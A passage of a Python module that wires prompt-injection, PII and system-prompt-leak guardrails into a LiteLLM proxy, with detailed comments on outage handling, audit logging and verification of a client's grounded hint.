"""LiteLLM CustomGuardrail entrypoints. Wiring only — no policy, no detection."""

from __future__ import annotations

import os
import time
from typing import Any

from guardrails import audit
from guardrails.canonical import canonicalize
from guardrails.policy import ControlConfig, Policy, decide
from guardrails.scanners.injection import InjectionScanner
from guardrails.scanners.patterns import scan_exfil, scan_secrets, scan_system_echo
from guardrails.scanners.pii import PiiScanner
from guardrails.spans import extract_spans
from guardrails.types import Action, Decision, Span, SpanSource
from litellm._logging import verbose_proxy_logger
from litellm.integrations.custom_guardrail import CustomGuardrail

# Verified against the installed litellm==1.83.10 source
# (litellm/proxy/common_request_processing.py::_handle_llm_api_exception,
# which both /v1/chat/completions and /v1/completions route through): the
# call_type LiteLLM actually hands a pre_call hook is the CallTypes enum
# value, and for a chat request that is "acompletion" (async) or
# "completion" (sync) — never "chat_completion"/"achat_completion". Those
# two strings appear in no CallTypes member and would never match a real
# request; kept out rather than carried forward from the brief unverified.
_CHAT_CALL_TYPES = frozenset({"completion", "acompletion"})

POLICY_PATH = os.environ.get("GUARDRAIL_POLICY_PATH", "/app/guardrails/policy.yaml")
SCANNER_API_BASE = os.environ.get("SCANNER_API_BASE", "http://nufi-scanner:8000")
# Measured: ~200 ms per 450-token window, and the scanner caps a request at
# _MAX_WINDOWS_PER_REQUEST windows, so a full scan lands near 5 s worst case.
# G1 fails closed, so a timeout is a 503 for the user — leave headroom.
SCANNER_TIMEOUT_S = float(os.environ.get("SCANNER_TIMEOUT_S", "8.0"))

# Where the pre_call phase records its verdict on the client's grounded hint,
# for post_call controls to read. Namespaced so a client cannot forge it: the
# resolver overwrites this key on every request before anything reads it.
VERIFIED_GROUNDED_KEY = "nufi_grounded_verified"


class GuardrailBlocked(Exception):
    """Raised to stop a request. LiteLLM surfaces this to the caller.

    Carries `status_code` (plain attribute, not an `HTTPException`
    subclass) because LiteLLM's own exception-to-response mapping reads
    `status_code` off whatever a guardrail hook raises — verified directly
    against the installed litellm==1.83.10 source, in BOTH exception paths
    a chat completion can take:
      - the legacy `completion()` endpoint's inline
        `except Exception as e: raise ProxyException(...,
        code=getattr(e, "status_code", 500))`;
      - `chat_completion()`'s route through
        `ProxyBaseLLMRequestProcessing._handle_llm_api_exception`, whose
        final fallback (reached by anything that is not an `HTTPException`
        or `httpx.HTTPStatusError`) is the identical
        `code=getattr(e, "status_code", 500)`.
    A bare `Exception` has neither attribute, so every block would surface
    to the caller — and to any 5xx-based alerting — as a 500 server error
    indistinguishable from an outage. This module's own comment above
    `SCANNER_TIMEOUT_S` already promises the caller a 503 on a scanner
    timeout; the brief's `class GuardrailBlocked(Exception)` did not
    deliver that promise, defaulting every raise to 500. `status_code`
    closes that gap without adding a `fastapi` dependency this package does
    not otherwise need (it is not installed in this venv or in CI's
    `litellm` — only bare `pip install litellm` — and is only present at
    runtime because the proxy's own base image bundles it).

    Not subclassing `fastapi.HTTPException`: doing so would let LiteLLM's
    `_serialize_http_exception_detail` unpack a structured dict `detail`
    into `ProxyException.provider_specific_fields`, which is the most
    promising carrier for `code`/`event_id` to survive to the client
    verbatim — but confirming that shape requires `fastapi` importable,
    which is a dependency decision (and the empirical wire-format check)
    the plan explicitly reserves for Task 15 Step 9. Recorded here so that
    task does not have to rediscover it.
    """

    def __init__(
        self, code: str, event_id: str, detail: str, status_code: int = 400
    ) -> None:
        self.code = code
        self.event_id = event_id
        self.detail = detail
        self.status_code = status_code
        super().__init__(detail)

    def to_body(self) -> dict[str, Any]:
        return {
            "error": {
                "type": "nufi_guardrail_blocked",
                "code": self.code,
                "event_id": self.event_id,
                "detail": self.detail,
            }
        }


class BaseNufiGuardrail(CustomGuardrail):
    control_id: str = ""

    # Can THIS control's outage path ever actually change what happens to a
    # request/response — block it, withhold it — or does every path through
    # `_on_outage` end in returning the input unchanged regardless of what
    # `enforced` says? Defaults to `False`: across this plan's five controls,
    # only G1 (raises `GuardrailBlocked`) and G3 (same) can actually enforce
    # on an outage — G2a, G2b, and G4 (which, like G2b, only rewrites text)
    # cannot. Recording `enforced=True` on an outage decision that
    # structurally cannot enforce anything writes a phantom entry into
    # `nufi_guardrail_decisions_total{action="block", enforced="true"}` — a
    # series shared with G1, where every entry IS a real block, and the exact
    # number the rollout plan reads to decide whether enforcement is safe. A
    # missing signal reads as a gap; a wrong one reads as fact — the worse of
    # the two, and the one a default of `True` would hand to every future
    # control that says nothing. Only a control that genuinely has a
    # blocking/withholding mechanism (see `G1Injection`) should override this
    # to `True` — saying nothing must be the safe choice, not the dangerous
    # one a majority-shaped default would make it.
    outage_can_enforce: bool = False

    def __init__(self, policy: Policy | None = None, **kwargs: Any) -> None:
        super().__init__(**kwargs)
        self._policy = policy or Policy.load(POLICY_PATH)
        self._control = self._policy.control(self.control_id)
        audit.GUARDRAIL_ENABLED.labels(
            control=self.control_id, mode=self._control.mode
        ).set(1 if self._control.enabled else 0)

    @property
    def control(self) -> ControlConfig:
        return self._control

    def _enforcing(self) -> bool:
        return self._control.enabled and self._control.mode != "logging_only"

    def _context(self, data: dict[str, Any], key: Any) -> dict[str, Any]:
        """Build `audit.build_event`'s `request_context`.

        `audit.build_event` documents that a key ABSENT from this dict is
        omitted from the event entirely, never defaulted to `None` — "a
        None copied into every event looks, on the reading side, identical
        to 'we checked and there wasn't one'". Setting every key
        unconditionally (including `None` when a key/model attribute is
        missing) would silently defeat that contract at the one call site
        that actually supplies it, so each optional field is included only
        when it has a real value.
        """
        context: dict[str, Any] = {"policy_digest": self._policy.digest()}
        key_alias = getattr(key, "key_alias", None)
        if key_alias is not None:
            context["key_alias"] = key_alias
        team_id = getattr(key, "team_id", None)
        if team_id is not None:
            context["team_id"] = team_id
        model = data.get("model")
        if model is not None:
            context["model"] = model
        return context

    def resolve_grounded(self, data: dict[str, Any], key: Any) -> bool:
        """Evaluate the grounded hint against the calling key and record the verdict.

        Only callable from a pre_call hook, which is the only place LiteLLM
        hands us the API key object. Post-call controls read the verdict via
        `verified_grounded` — they must never re-read the raw client hint,
        which is attacker-controllable.
        """
        key_metadata = getattr(key, "metadata", None)
        if not isinstance(key_metadata, dict):
            key_metadata = {}
        request_metadata = data.setdefault("metadata", {})
        if not isinstance(request_metadata, dict):
            return False

        granted = bool(key_metadata.get("allow_grounded_hint"))
        claimed = bool(request_metadata.get("nufi_grounded"))
        verdict = granted and claimed
        request_metadata[VERIFIED_GROUNDED_KEY] = verdict
        return verdict

    @staticmethod
    def verified_grounded(request_data: dict[str, Any] | None) -> bool:
        metadata = (request_data or {}).get("metadata") or {}
        if not isinstance(metadata, dict):
            return False
        return metadata.get(VERIFIED_GROUNDED_KEY) is True

    def _emit(
        self,
        data: dict[str, Any],
        decision: Any,
        transforms: tuple[str, ...],
        key: Any,
        enforced: bool,
    ) -> dict[str, Any]:
        event = audit.build_event(
            decision, transforms, self._context(data, key), enforced
        )
        try:
            audit.record(data, event)
        except audit.AuditRecordError:
            # `event["event_id"]` above is already valid regardless — only
            # the metadata ATTACH (and this one event's entry in
            # `guardrail_information`) failed, not the decision itself.
            # `audit.record` increments GUARDRAIL_DECISIONS before it ever
            # touches `data["metadata"]` (see audit.py), so the decision is
            # still visible in Prometheus even though this call raised.
            #
            # Swallowed here rather than re-raised: re-raising would let a
            # malformed `data["metadata"]` shape (e.g. a client sending
            # `"metadata": "not-a-dict"`) turn into an uncaught exception
            # from THIS hook regardless of mode — including logging_only,
            # where it must never break traffic. The caller can still raise
            # the correct `GuardrailBlocked` when enforcing, since it reads
            # `event["event_id"]`, not this method's return value's
            # persistence. Logged, not silent — the request-level count is
            # covered by Prometheus, but this surfaces the anomaly itself.
            verbose_proxy_logger.error(
                "guardrail %s: audit.record failed to attach event %s: "
                "malformed request metadata shape",
                self.control_id,
                event.get("event_id"),
            )
        return event


class G1Injection(BaseNufiGuardrail):
    control_id = "G1"
    # Raises `GuardrailBlocked` on a fails-closed outage (see `_on_outage`
    # below), so a fails-closed outage here is a real block, not a phantom one.
    outage_can_enforce = True

    def __init__(
        self, policy: Policy | None = None, scanner: Any | None = None, **kwargs: Any
    ) -> None:
        super().__init__(policy=policy, **kwargs)
        self._scanner = scanner or InjectionScanner(
            base_url=SCANNER_API_BASE, timeout_s=SCANNER_TIMEOUT_S
        )

    async def async_pre_call_hook(
        self, user_api_key_dict: Any, cache: Any, data: dict[str, Any], call_type: str
    ) -> dict[str, Any]:
        # Resolved before EVERY early return, including the non-chat-call-type
        # one immediately below. This is the only phase LiteLLM hands over the
        # key object, and a post_call control treats a missing verdict as
        # not-grounded — a return that skips this would silently change that
        # control's redaction behaviour for any call type it runs against,
        # not just the chat ones this hook goes on to scan.
        grounded = self.resolve_grounded(data, user_api_key_dict)

        if call_type not in _CHAT_CALL_TYPES:
            return data

        if not self._control.enabled:
            return data

        messages = data.get("messages")
        if messages is not None and (
            not isinstance(messages, list)
            or any(not isinstance(message, dict) for message in messages)
        ):
            # `extract_spans` assumes a list of dict messages and is off
            # limits to modify here; a malformed shape would otherwise raise
            # AttributeError deep inside it — an exception type nothing in
            # this hook expects. Treated the same as a scanner outage: we
            # cannot certify a request we cannot even parse, so the same
            # enforced/fail-open-by-mode branching applies.
            return self._on_outage(
                data, user_api_key_dict, TypeError("'messages' is not a list of dicts")
            )

        spans = extract_spans(messages)
        if not spans:
            return data

        started = time.perf_counter()
        try:
            findings = await self._scanner.scan(spans)
        except Exception as exc:
            # Caught broadly, not just `ScannerUnavailable`: a scanner that
            # raises a type this hook does not recognise must still respect
            # logging_only's never-break-traffic guarantee (and enforcing's
            # fail-closed guarantee) rather than escape as an exception type
            # nothing here expects. `Scanner.scan` is documented to raise
            # only `ScannerUnavailable`, but a hook that trusts that
            # contract absolutely is one bug away from either breaking
            # shadow-mode traffic or bypassing enforcement, depending on
            # where a future scanner implementation's bug happens to sit.
            return self._on_outage(data, user_api_key_dict, exc)
        finally:
            audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
                time.perf_counter() - started
            )

        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(0)

        transforms = audit.canonical_transforms(
            [canonicalize(span.text) for span in spans]
        )
        decision = decide(self._control, findings, grounded)
        if decision.action is Action.ALLOW:
            return data

        enforced = self._enforcing()
        event = self._emit(data, decision, transforms, user_api_key_dict, enforced)
        if not enforced:
            return data

        raise GuardrailBlocked(
            code="LLM01_INJECTION",
            event_id=event["event_id"],
            detail=decision.reason,
            status_code=400,
        )

    def _on_outage(
        self, data: dict[str, Any], key: Any, exc: Exception
    ) -> dict[str, Any]:
        """Record the outage, then act on it.

        An outage that blocks a request is a blocking path, and a blocking
        path with no audit event is invisible: `GUARDRAIL_DECISIONS` stays
        flat, so an operator watching it cannot distinguish "G1 is
        fail-closing on every request because the scanner is down" from
        "nothing was blocked at all" — and an `event_id` handed to the
        client that was never recorded anywhere cannot be looked up
        afterwards. This was the brief's own reference `_on_outage`
        (`raise GuardrailBlocked(..., event_id=audit.new_event_id(), ...)`
        with no `_emit` call at all) — the same blind spot this whole
        project exists to remove, reproduced inside the control whose job
        is to make control state visible. Fixed by building a synthetic
        `Decision` and routing it through the same `_emit` path as any
        other verdict, in BOTH enforcing and shadow mode, so
        `GUARDRAIL_DEGRADED` (the infra-level "something is down" signal)
        and the audit trail (the per-request "here is what happened"
        signal) are both populated regardless of whether the request was
        actually enforced against.

        `decision.action` is always `Action.BLOCK`: an outage always means
        "we could not certify this request", independent of whether this
        control's `fail` setting or `mode` goes on to act on that. Whether
        it is actually enacted is carried entirely by `enforced` — `fail:
        open` and `logging_only` both produce `enforced=False` (a visible
        "would have blocked" event, never a broken request), `fail: closed`
        plus an enforcing mode produces `enforced=True` and the raise below.

        `decision.reason` never includes `str(exc)`: with `findings=()`,
        `audit._safe_reason` returns `decision.reason` UNCHANGED (there are
        no findings to rebuild it from), so this is the one place in this
        module where nothing downstream sanitises what lands in the
        server-side audit trail. `type(exc).__name__` is always a fixed,
        safe Python identifier; the exception's own message — which could
        echo request-shaped text from a future scanner or decoder bug — is
        confined to the client-facing `GuardrailBlocked.detail` below and
        the operator-only warning log, never the persisted event.
        """
        verbose_proxy_logger.warning(
            "guardrail %s could not certify request (%s): %s",
            self.control_id,
            type(exc).__name__,
            exc,
        )
        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(1)

        # `self.outage_can_enforce` gates this alongside `fails_closed` and
        # `_enforcing()` — not because G1 needs it today (it is declared
        # `True` above precisely because this class DOES raise
        # `GuardrailBlocked` below), but because leaving it out of the
        # formula would make the class attribute purely decorative for the
        # one control that actually has a mechanism to enforce: if a future
        # edit ever removed the `outage_can_enforce = True` override from
        # this class, `self._control.fails_closed and self._enforcing()`
        # alone would still raise on a fails-closed outage, silently
        # disagreeing with what the class now claims about itself.
        enforced = self.outage_can_enforce and self._control.fails_closed and self._enforcing()
        decision = Decision(
            action=Action.BLOCK,
            control=self.control_id,
            risk=self._control.risk,
            findings=(),
            reason=f"guardrail unavailable: {type(exc).__name__}",
        )
        event = self._emit(data, decision, (), key, enforced)
        if enforced:
            raise GuardrailBlocked(
                code="GUARDRAIL_UNAVAILABLE",
                event_id=event["event_id"],
                detail=str(exc),
                status_code=503,
            )
        return data


PRESIDIO_API_BASE = os.environ.get(
    "PRESIDIO_ANALYZER_API_BASE", "http://presidio-analyzer:3000"
)
PRESIDIO_TIMEOUT_S = float(os.environ.get("PRESIDIO_TIMEOUT_S", "5.0"))
PII_ENTITIES = [
    "EMAIL_ADDRESS",
    "PHONE_NUMBER",
    "CREDIT_CARD",
    "US_SSN",
    "IBAN_CODE",
    "IP_ADDRESS",
    "PERSON",
    "LOCATION",
]


def _default_pii_scanner() -> PiiScanner:
    return PiiScanner(
        base_url=PRESIDIO_API_BASE,
        timeout_s=PRESIDIO_TIMEOUT_S,
        entities=PII_ENTITIES,
        language=os.environ.get("PRESIDIO_LANGUAGE", "en"),
    )


class G2aPiiInput(BaseNufiGuardrail):
    """Detects PII in the prompt. Logs only — the prompt is never rewritten.

    Not an oversight to be "improved" later: the previous system masked PII
    on input and the model began answering the placeholder instead of the
    question — a user asking about `sun@dudaji.com` got a reply about
    `<PERSON>`. `data` is never touched by this control, in any mode, on
    any finding. See policy.yaml's G2a for the recorded rationale.
    """

    control_id = "G2a"
    # This control has no mechanism to withhold or alter a request: every
    # path through `async_pre_call_hook` and `_on_outage` ends in
    # `return data`, in every mode, regardless of `fail`. See
    # `BaseNufiGuardrail.outage_can_enforce` for why this must be declared
    # explicitly rather than left to the (enforcement-capable) default.
    outage_can_enforce = False

    def __init__(
        self, policy: Policy | None = None, scanner: Any | None = None, **kwargs: Any
    ) -> None:
        super().__init__(policy=policy, **kwargs)
        self._scanner = scanner or _default_pii_scanner()

    async def async_pre_call_hook(
        self, user_api_key_dict: Any, cache: Any, data: dict[str, Any], call_type: str
    ) -> dict[str, Any]:
        if call_type not in _CHAT_CALL_TYPES or not self._control.enabled:
            return data

        messages = data.get("messages")
        if messages is not None and (
            not isinstance(messages, list)
            or any(not isinstance(message, dict) for message in messages)
        ):
            # Same malformed-shape risk `G1Injection` guards against, and for
            # the same reason: `extract_spans` assumes a list of dict messages
            # and is off limits to modify here. Left unguarded, a
            # non-conforming `messages` shape would raise AttributeError deep
            # inside it — an exception type this "detect and log only, never
            # break traffic" control does not expect, and uncaught, WOULD
            # break traffic: the exact contract this control exists to
            # uphold. Routed through the same outage path as a scanner
            # failure rather than reimplemented here.
            return self._on_outage(
                data, user_api_key_dict, TypeError("'messages' is not a list of dicts")
            )

        spans = extract_spans(messages)
        if not spans:
            return data

        started = time.perf_counter()
        try:
            findings = await self._scanner.scan(spans) + scan_secrets(spans)
        except Exception as exc:
            # Caught broadly, not just `ScannerUnavailable`, matching
            # `G1Injection`: `PiiScanner.scan` is documented to raise only
            # `ScannerUnavailable`, and `scan_secrets` is documented to never
            # raise at all (it is pure) — but trusting either contract
            # absolutely is one bug away from turning a shadow-mode
            # measurement, or this control's own fail-open guarantee, into a
            # broken live request.
            return self._on_outage(data, user_api_key_dict, exc)
        finally:
            audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
                time.perf_counter() - started
            )

        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(0)

        # `grounded` never affects this control's own decision: G2a has no
        # `respect_grounded_hint` option in policy.yaml (only G2b does), so
        # `policy.decide`'s `grounded and control.options.get(...)` branch
        # can never fire here regardless of the value passed. Hardcoded
        # rather than resolved from the request: G1 is the sole, mandatory
        # pre_call control responsible for recording the verified verdict
        # (`resolve_grounded`) for every *other* control to read; G2a does
        # not need it for itself and must not re-derive it from the raw,
        # attacker-controllable client hint.
        decision = decide(self._control, findings, grounded=False)
        if decision.action is not Action.ALLOW:
            self._emit(data, decision, (), user_api_key_dict, self._enforcing())
        return data

    def _on_outage(self, data: dict[str, Any], key: Any, exc: Exception) -> dict[str, Any]:
        """Record the outage so it is visible, then let the request continue.

        A `GUARDRAIL_DEGRADED` gauge flip alone is a fleet-wide signal, not a
        per-request one: an operator investigating one specific "PII went
        through unnoticed" report needs an `event_id` in the audit trail to
        confirm "G2a could not see this particular request", not just "the
        gauge was elevated at some point". This is the same blind spot Task
        10 found and fixed in `G1Injection._on_outage` — reproduced here
        because a control that only sets a gauge on outage leaves
        `GUARDRAIL_DECISIONS` unable to distinguish "no PII in traffic" from
        "PII detection was blind for this request".

        `enforced` is gated by `self.outage_can_enforce` (declared `False`
        above), not just this control's own `_enforcing()` — an earlier
        draft passed `self._enforcing()` alone, the same value the
        non-outage path below passes to `_emit`, and NOT
        `fails_closed and _enforcing()` as `G1Injection._on_outage` computes
        it either. Both of those still let `enforced` come back `True`
        whenever this control is out of shadow mode, even though G2a always
        returns `data` unchanged, in every mode, regardless of `fail` — a
        phantom "enforced" block recorded for a control that structurally
        cannot block anything. `outage_can_enforce` collapses `enforced` to
        `False` unconditionally, matching what this control can actually do
        rather than what mode it happens to be in.
        """
        verbose_proxy_logger.warning(
            "guardrail %s could not scan request (%s): %s",
            self.control_id,
            type(exc).__name__,
            exc,
        )
        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(1)
        decision = Decision(
            action=Action.BLOCK,
            control=self.control_id,
            risk=self._control.risk,
            findings=(),
            reason=f"guardrail unavailable: {type(exc).__name__}",
        )
        enforced = self.outage_can_enforce and self._enforcing()
        self._emit(data, decision, (), key, enforced)
        return data


class G2bPiiOutput(BaseNufiGuardrail):
    """Redacts PII and secrets in the model's response.

    Honours the grounded hint, but only the *verified* verdict `G1Injection`
    recorded during `pre_call` — read via `verified_grounded`, never the raw
    client claim `data["metadata"]["nufi_grounded"]`, which is
    attacker-controllable. A user asking about an email address inside their
    own (grounded) document gets the real address back.
    """

    control_id = "G2b"

    def __init__(
        self, policy: Policy | None = None, scanner: Any | None = None, **kwargs: Any
    ) -> None:
        super().__init__(policy=policy, **kwargs)
        self._scanner = scanner or _default_pii_scanner()

    @staticmethod
    def redact(text: str, findings: list[Any]) -> str:
        """Replace each finding's span with `[ENTITY]`, back to front.

        Findings are processed in DESCENDING `start` order so every
        earlier (lower-start) replacement slices into a suffix of `text`
        that has not been touched yet — its own `start`/`end` stay valid
        character offsets even as the string shortens from replacements
        already made further to the right. `PiiScanner` confirms Presidio's
        offsets are character offsets matching Python `str` indexing
        (verified against Vietnamese in NFC and NFD, and an astral-plane
        emoji), which is what makes this front-to-back invariant hold at
        all.

        Each finding's offsets are additionally clamped to `[0, len(text)]`
        and to the region not yet consumed by a previously-processed
        (higher-start) finding. Two independent detectors — Presidio and
        the secrets regex list — scan the same text and can report
        overlapping spans; re-slicing an overlapping finding with its
        ORIGINAL offsets against the ALREADY-SHORTENED string would index
        into the wrong characters, either corrupting adjacent text or
        leaving a fragment of the original PII exposed — and neither
        failure raises, so it would look exactly like a clean redaction.
        Clamping to the not-yet-redacted region is what keeps this correct
        when findings overlap, instead of trusting each finding's offsets
        in isolation.
        """
        if not findings:
            return text
        length = len(text)
        out = text
        redacted_from = length
        for finding in sorted(findings, key=lambda f: f.start, reverse=True):
            start = max(0, min(finding.start, length))
            end = max(start, min(finding.end, length))
            end = min(end, redacted_from)
            if start >= end:
                # Fully inside a region a higher-start finding already
                # redacted (or an offset that does not fit `text` at all) —
                # nothing left here to act on.
                continue
            label = finding.entity or "REDACTED"
            out = out[:start] + f"[{label}]" + out[end:]
            redacted_from = start
        return out

    async def apply_guardrail(
        self,
        inputs: dict[str, Any],
        request_data: dict[str, Any] | None,
        input_type: str,
        logging_obj: Any = None,
    ) -> dict[str, Any]:
        """Redact PII in the model's response.

        This is LiteLLM's real base-class hook (`CustomGuardrail.apply_guardrail`,
        verified against the installed litellm==1.83.10, not the docs page —
        an earlier draft of this method used a `(text, ..., request_data) ->
        str` signature taken from the docs page instead). The method NAME is
        load-bearing: `litellm/proxy/common_request_processing.py` checks
        `if "apply_guardrail" in type(cb).__dict__` and reroutes dispatch
        through `unified_guardrail`'s translation layer whenever it is
        present, for BOTH the non-streaming (`process_output_response`) and
        end-of-stream streaming (`process_output_streaming_response`) paths —
        the "used by both hooks" character `redact` is built around.
        Defining this method with any other signature does not fall back to
        a different hook; every per-provider handler (e.g.
        `litellm/llms/openai/chat/guardrail_translation/handler.py`) calls
        `guardrail_to_apply.apply_guardrail(inputs=..., request_data=...,
        input_type=..., logging_obj=...)` positionally-compatible with
        keywords, so a mismatched signature raises `TypeError` on every
        request through the proxy — an outage caused by the guardrail
        itself.

        `inputs["texts"]` is a list of strings (`GenericGuardrailAPIInputs`);
        the return value replaces them. `input_type` distinguishes the
        request leg from the response leg — G2b only acts on `"response"`,
        since this control exists to redact what the model said, not what
        the user asked (that is G2a's job, and G2a never rewrites anything).

        Each text is scanned and decided on independently: nothing on
        `Finding` identifies which text produced it, so a finding's offsets
        are only safe to slice against the text that produced it, and one
        text's verdict must never redact another's. A scanner failure on
        ONE text degrades to "leave THIS text unredacted, record the outage"
        via `_on_outage` and continues with the rest of the batch — it does
        NOT abort the whole response and discard every other text's
        already-computed, already-audited redaction. An earlier draft of
        this method wrapped the entire loop in one try/except and returned
        the wholly-untouched `inputs` on any single text's failure: if text
        #1 had already been redacted and its REDACT decision already
        `_emit`-ted (audit trail says "redacted, enforced"), and text #3
        then failed, that draft discarded text #1's redaction too — MORE PII
        reached the client than a per-text failure alone would ever leak,
        while the audit trail kept claiming text #1 was redacted. Verified
        by execution (see the task report) rather than assumed correct.
        """
        if input_type != "response" or not self._control.enabled:
            return inputs

        texts = inputs.get("texts") or []
        if not texts:
            return inputs

        data = request_data if isinstance(request_data, dict) else {}
        grounded = self.verified_grounded(data)
        enforced = self._enforcing()
        rewritten: list[str] = []

        for item in texts:
            if not item:
                rewritten.append(item)
                continue

            spans = [Span(text=item, source=SpanSource.UNTRUSTED, message_index=0)]
            started = time.perf_counter()
            try:
                findings = await self._scanner.scan(spans) + scan_secrets(spans)
            except Exception as exc:
                # Caught broadly for the same reason as `G2aPiiInput`: neither
                # `PiiScanner.scan` nor `scan_secrets`'s documented contract
                # should be trusted absolutely by the one control whose
                # entire job is not letting PII pass unredacted. Scoped to
                # THIS item only — the rest of the batch still gets a real
                # decision.
                rewritten.append(self._on_outage(item, data, exc))
                continue
            finally:
                audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
                    time.perf_counter() - started
                )

            audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(0)

            decision = decide(self._control, findings, grounded)
            if decision.action is not Action.REDACT:
                rewritten.append(item)
                continue

            self._emit(data, decision, (), None, enforced)
            rewritten.append(self.redact(item, list(decision.findings)) if enforced else item)

        if enforced:
            inputs["texts"] = rewritten
        return inputs

    def _on_outage(self, text: str, request_data: Any, exc: Exception) -> str:
        """Record the outage, then fail open: return `text` unredacted.

        G2b's policy is `fail: open` (policy.yaml), matching G2a's own
        rationale: an outage must not withhold or corrupt a response the
        model already produced. But an outage that silently returns
        unredacted PII is the highest-stakes version of the Task 10 blind
        spot this project keeps closing — with no signal beyond the
        fleet-wide `GUARDRAIL_DEGRADED` gauge, an operator investigating one
        specific PII-leak report has no per-request `event_id` to confirm
        "G2b could not redact this one" versus "there was nothing to
        redact". `enforced` is always `False`: this control has no mechanism
        to withhold a response at all (unlike `G1Injection`, it never raises
        `GuardrailBlocked`), so recording anything else would claim an
        effect that never happened. If a future policy ever sets G2b's
        `fail: closed`, this method still fails open — there is no
        response-blocking mechanism for this control to invoke, and adding
        one is a larger design decision this task does not make silently.
        """
        verbose_proxy_logger.warning(
            "guardrail %s could not scan response (%s): %s",
            self.control_id,
            type(exc).__name__,
            exc,
        )
        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(1)
        data = request_data if isinstance(request_data, dict) else {}
        decision = Decision(
            action=Action.BLOCK,
            control=self.control_id,
            risk=self._control.risk,
            findings=(),
            reason=f"guardrail unavailable: {type(exc).__name__}",
        )
        self._emit(data, decision, (), None, False)
        return text


class G3SystemPromptLeak(BaseNufiGuardrail):
    """Blocks a response that regurgitates the system prompt actually in force.

    Compares the response text against the system prompt via `scan_system_echo`
    (n-gram overlap over CONTIGUOUS word-runs — see that function's docstring
    for its honest blind spots: a paraphrase or reordering is invisible to it,
    and a system prompt shorter than its 8-word window is not checked at all).
    Fires regardless of how the leak was elicited, because the comparison is
    against the OUTPUT, never against the request that produced it.
    """

    control_id = "G3"
    # `async_pre_call_hook`-shaped outage handling: `scan_system_echo` is
    # documented pure (no I/O, never raises — see scanners/patterns.py's
    # module docstring), but `G1Injection`'s own history is the reason
    # nothing in this module trusts a scanner contract absolutely just
    # because it is documented — a bug in a future edit of a "pure"
    # function is still a bug. This control DOES have a real blocking
    # mechanism (`GuardrailBlocked` below), so an outage under `fail:
    # closed` is a genuine block, not a phantom one — declared `True` to
    # match, mirroring `G1Injection` rather than `G2aPiiInput`/`G2bPiiOutput`
    # (which have no such mechanism and correctly declare `False`).
    outage_can_enforce = True

    @staticmethod
    def _system_prompt(request_data: dict[str, Any]) -> str:
        parts = [
            span.text
            for span in extract_spans(request_data.get("messages"))
            if span.source is SpanSource.SYSTEM
        ]
        return "\n".join(parts)

    def _on_outage(self, data: dict[str, Any], exc: Exception) -> None:
        """Record the outage, then act on it — mirrors `G1Injection._on_outage`.

        Called once for a request-wide certification failure (the system
        prompt itself could not be determined — see the malformed-`messages`
        guard below) or once per text whose own `scan_system_echo` call
        raised. Either way this control could not certify THAT text/request
        as leak-free, which is `Decision(action=Action.BLOCK, findings=())`
        by the same reasoning `G1Injection._on_outage` documents: an outage
        always means "we could not certify this", independent of whether
        `fail`/`mode` goes on to act on it. `enforced` is gated by
        `outage_can_enforce` (see the class attribute above) alongside
        `fails_closed` and `_enforcing()`, so a future edit that ever drops
        the `= True` override cannot silently start raising anyway — the
        exact defensive shape `G1Injection._on_outage` already uses this
        gate for.
        """
        verbose_proxy_logger.warning(
            "guardrail %s could not certify response (%s): %s",
            self.control_id,
            type(exc).__name__,
            exc,
        )
        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(1)
        decision = Decision(
            action=Action.BLOCK,
            control=self.control_id,
            risk=self._control.risk,
            findings=(),
            reason=f"guardrail unavailable: {type(exc).__name__}",
        )
        enforced = self.outage_can_enforce and self._control.fails_closed and self._enforcing()
        event = self._emit(data, decision, (), None, enforced)
        if enforced:
            raise GuardrailBlocked(
                code="GUARDRAIL_UNAVAILABLE",
                event_id=event["event_id"],
                detail=str(exc),
                status_code=503,
            )

    async def apply_guardrail(
        self,
        inputs: dict[str, Any],
        request_data: dict[str, Any] | None,
        input_type: str,
        logging_obj: Any = None,
    ) -> dict[str, Any]:
        """Block a response that echoes the system prompt.

        Same real `apply_guardrail` contract as `G2bPiiOutput` — see that
        method's docstring for why the signature and the `"response"`-only
        gate are load-bearing, verified against the installed
        litellm==1.83.10 source rather than the docs page.

        Each text is scanned and decided ON ITS OWN: nothing on `Finding`
        identifies which text produced it (same reasoning `G2bPiiOutput`
        documents), and a text with `n>1` candidate completions must not
        have a leak in one candidate block a clean sibling from ever being
        evaluated — the loop below raises as soon as ONE text's own
        decision blocks, rather than pooling every text's findings into a
        single request-wide verdict first.
        """
        if input_type != "response" or not self._control.enabled:
            return inputs

        texts = inputs.get("texts") or []
        if not texts:
            return inputs

        data = request_data if isinstance(request_data, dict) else {}
        messages = data.get("messages")
        if messages is not None and (
            not isinstance(messages, list)
            or any(not isinstance(message, dict) for message in messages)
        ):
            # Same malformed-shape risk `G1Injection` guards against:
            # `extract_spans` (called by `_system_prompt` below) assumes a
            # list of dict messages and is off limits to modify here. We
            # cannot even determine what the system prompt IS, so nothing
            # downstream can be certified — routed through `_on_outage`
            # rather than raising `AttributeError` from deep inside
            # `extract_spans`, an exception type this hook does not expect.
            self._on_outage(data, TypeError("'messages' is not a list of dicts"))
            return inputs

        system_prompt = self._system_prompt(data)
        if not system_prompt:
            # No system message in the request (or one too short for
            # `scan_system_echo`'s own `_MIN_SYSTEM_PROMPT_WORDS` gate to
            # bother comparing — that shorter-prompt case is instead caught
            # inside `scan_system_echo` itself, per-text, below). Nothing to
            # compare the response against, so there is nothing to leak.
            # Silent — no audit event — matching every other control's
            # "nothing to evaluate" shortcut (`G1Injection`'s `if not spans`,
            # `G2bPiiOutput`'s `if not texts`): an ALLOW with no finding never
            # gets an event either, so this is not a new exception to that
            # rule, just reached one branch earlier.
            return inputs

        for item in texts:
            if not isinstance(item, str) or not item:
                continue

            started = time.perf_counter()
            try:
                findings = scan_system_echo(item, system_prompt)
            except Exception as exc:
                # Caught broadly, not narrowed to a specific type: matches
                # every other control in this module (`G1Injection`,
                # `G2aPiiInput`, `G2bPiiOutput`) — trusting `scan_system_echo`'s
                # documented "pure, never raises" contract absolutely is one
                # bug away from turning a shadow-mode measurement, or this
                # control's own fail-closed guarantee, into an unhandled
